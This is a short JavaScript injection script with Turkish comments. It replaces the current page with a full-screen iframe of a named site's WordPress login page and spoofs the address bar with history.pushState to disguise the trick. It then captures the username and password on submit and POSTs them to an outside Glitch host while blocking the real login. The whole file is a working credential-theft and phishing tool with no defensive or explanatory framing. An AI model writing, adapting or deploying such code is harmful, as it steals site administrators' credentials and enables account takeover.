// script.js
(function() {
    // Mevcut sayfayı manipüle et
    const doc = document;
    doc.body.innerHTML = ''; // Sayfayı temizle

    // İframe oluştur
    const iframe = doc.createElement('iframe');
    iframe.src = 'https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1';
    iframe.style.width = '100%';
    iframe.style.height = '100vh';
    iframe.style.border = 'none';
    doc.body.appendChild(iframe);

    // Adres çubuğunu manipüle et
    window.history.pushState({}, doc.title, 'https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1');

    // İframe yüklendiğinde formu izle
    iframe.onload = () => {
        const iframeDoc = iframe.contentWindow.document;

        // Formu bul ve submit event’ini yakala
        const loginForm = iframeDoc.getElementById('loginform');
        if (loginForm) {
            loginForm.addEventListener('submit', (e) => {
                e.preventDefault(); // Gerçek isteği durdur (isteğe bağlı)

                // Form verisini al
                const formData = new FormData(loginForm);
                const log = formData.get('log'); // Kullanıcı adı
                const pwd = formData.get('pwd'); // Şifre

                // Glitch’e gönder
                fetch('https://canyon-charmed-dogsled.glitch.me/log', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: `log=${encodeURIComponent(log)}&pwd=${encodeURIComponent(pwd)}`
                })
                .then(response => console.log('Veri Glitch’e gönderildi'))
                .catch(error => console.error('Hata:', error));

                // İsteğe bağlı: Gerçek formu gönder
                // loginForm.submit();
            });
        }
    };
})();
